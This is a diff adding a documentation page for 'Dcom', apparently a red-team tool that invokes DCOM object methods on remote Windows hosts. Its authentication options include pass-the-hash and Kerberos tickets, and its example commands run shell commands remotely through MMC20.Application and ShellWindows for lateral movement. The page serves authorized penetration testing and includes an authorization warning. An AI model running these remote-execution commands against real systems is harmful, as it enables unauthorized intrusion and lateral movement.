@@ -1,0 +1,169 @@
+---
+title: "Dcom"
+description: "Invoke methods on OLE Automation objects hosted on remote systems over DCOM — useful for remote code execution and lateral movement."
+---
+
+The `Dcom` tool activates a COM object by CLSID on a remote system and invokes methods on it via OLE Automation (IDispatch). This lets you execute functionality exposed by DCOM objects without writing custom COM client code.
+
+## Subcommands
+
+| Command | Description |
+|---|---|
+| [invoke](#invoke) | Activate a DCOM object and invoke a method on it |
+
+<Note>
+For help on any subcommand, run `Dcom <subcommand> -h`.
+</Note>
+
+---
+
+## invoke
+
+Activates an OLE Automation object by CLSID on a remote server and calls a named method on it, optionally passing arguments.
+
+```bash
+Dcom invoke [options] -Clsid <Guid> -MethodName <String> <ServerName> <Clsid> <MethodName> [<Arguments>]
+```
+
+<AccordionGroup>
+  <Accordion title="Parameters">
+    <ParamField path="ServerName" type="string" required>
+      Hostname or IP address of the server to connect to.
+    </ParamField>
+    <ParamField path="-Clsid" type="Guid" required>
+      CLSID (class identifier) of the COM object to activate, in standard `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format.
+    </ParamField>
+    <ParamField path="-MethodName (-M)" type="string" required>
+      Name of the method to invoke on the activated object.
+    </ParamField>
+    <ParamField path="-Arguments" type="string[]">
+      Arguments to pass to the method. Arguments are passed in order.
+    </ParamField>
+  </Accordion>
+
+  <Accordion title="Transport options">
+    <ParamField path="-EncryptRpc (-E)" type="boolean">
+      Encrypt all RPC messages exchanged with the remote object.
+    </ParamField>
+    <ParamField path="-ConsoleOutputStyle (-OutputStyle)" type="string">
+      Output format: `Freeform`, `Raw`, `Table`, `List`, `Csv`, `Tsv`, `Json`.
+    </ParamField>
+    <ParamField path="-SpnOverride" type="SpnMapping[]">
+      Override the Service Principal Name used for Kerberos authentication.
+    </ParamField>
+    <ParamField path="-AuthProxy" type="EndPoint">
+      Endpoint of an authentication proxy.
+    </ParamField>
+    <ParamField path="-Socks5" type="string">
+      SOCKS5 proxy endpoint (`host:port`).
+    </ParamField>
+  </Accordion>
+
+  <Accordion title="Authentication">
+    <ParamField path="-UserName (-u)" type="string">
+      User name (without domain).
+    </ParamField>
+    <ParamField path="-UserDomain (-ud)" type="string">
+      Domain of the authenticating user.
+    </ParamField>
+    <ParamField path="-Password (-p)" type="string">
+      Password.
+    </ParamField>
+    <ParamField path="-NtlmHash" type="string">
+      NTLM hash for pass-the-hash.
+    </ParamField>
+    <ParamField path="-Anonymous" type="boolean">
+      Use anonymous authentication.
+    </ParamField>
+    <ParamField path="-AesKey" type="string">
+      AES-128 or AES-256 Kerberos key.
+    </ParamField>
+    <ParamField path="-Tgt" type="string">
+      TGT file path (`.kirbi` or ccache).
+    </ParamField>
+    <ParamField path="-Kdc (-K)" type="string">
+      KDC endpoint (`host:port`).
+    </ParamField>
+    <ParamField path="-S4UserName" type="string">
+      User to impersonate via S4U2self.
+    </ParamField>
+  </Accordion>
+
+  <Accordion title="Connection">
+    <ParamField path="-HostAddress (-ha)" type="string[]">
+      Override network address(es) of the server.
+    </ParamField>
+    <ParamField path="-UseTcp6Only (-6)" type="boolean">
+      Use TCP over IPv6 only.
+    </ParamField>
+    <ParamField path="-UseTcp4Only (-4)" type="boolean">
+      Use TCP over IPv4 only.
+    </ParamField>
+  </Accordion>
+
+  <Accordion title="Output verbosity">
+    <ParamField path="-Verbose (-V)" type="boolean">
+      Print verbose messages.
+    </ParamField>
+    <ParamField path="-Diagnostic (-vv)" type="boolean">
+      Print diagnostic messages.
+    </ParamField>
+    <ParamField path="-LogLevel" type="string">
+      Minimum log severity: `Debug`, `Diagnostic`, `Verbose`, `Info`, `Warning`, `Error`, `Critical`.
+    </ParamField>
+  </Accordion>
+</AccordionGroup>
+
+## Common usage patterns
+
+<AccordionGroup>
+  <Accordion title="Remote code execution via MMC20.Application">
+    The MMC20.Application object (`{49B2791A-B1AE-4C90-9B8E-E860BA07F889}`) exposes a `Document.ActiveView.ExecuteShellCommand` method that can be used for remote code execution:
+
+    ```bash
+    Dcom invoke -UserName milchick@LUMON -Password Br3@kr00m! \
+      LUMON-FS1 \
+      {49B2791A-B1AE-4C90-9B8E-E860BA07F889} \
+      -MethodName Document.ActiveView.ExecuteShellCommand \
+      -Arguments cmd.exe, "", "cmd /c whoami > C:\\out.txt", "7"
+    ```
+  </Accordion>
+
+  <Accordion title="Remote code execution via ShellWindows">
+    The ShellWindows object (`{9BA05972-F6A8-11CF-A442-00A0C90A8F39}`) is another common target:
+
+    ```bash
+    Dcom invoke -UserName milchick@LUMON -Password Br3@kr00m! \
+      LUMON-FS1 \
+      {9BA05972-F6A8-11CF-A442-00A0C90A8F39} \
+      -MethodName Item -Arguments 0
+    ```
+  </Accordion>
+
+  <Accordion title="Discovering DCOM applications">
+    Use `Reg getdcomapp` to read DCOM application launch and access permissions from the registry before invoking:
+
+    ```bash
+    # Check if you have launch permission
+    Reg getdcomapp -UserName milchick@LUMON -Password Br3@kr00m! \
+      LUMON-FS1 \
+      -AppId {49B2791A-B1AE-4C90-9B8E-E860BA07F889} \
+      -OutputFields AppId, Title, LaunchPermissions, AccessPermissions
+    ```
+  </Accordion>
+</AccordionGroup>
+
+<Warning>
+DCOM invocations execute code on the remote system under the security context of the activated object. Verify that your engagement authorizes remote code execution before using `invoke`.
+</Warning>
+
+## Related tools
+
+<CardGroup cols={2}>
+  <Card title="Reg getdcomapp" href="/tools/reg#getdcomapp" icon="key">
+    Read DCOM application launch and access permissions from the remote registry.
+  </Card>
+  <Card title="Reg set" href="/tools/reg#set" icon="pencil">
+    Modify DCOM application configuration in the registry.
+  </Card>
+</CardGroup>
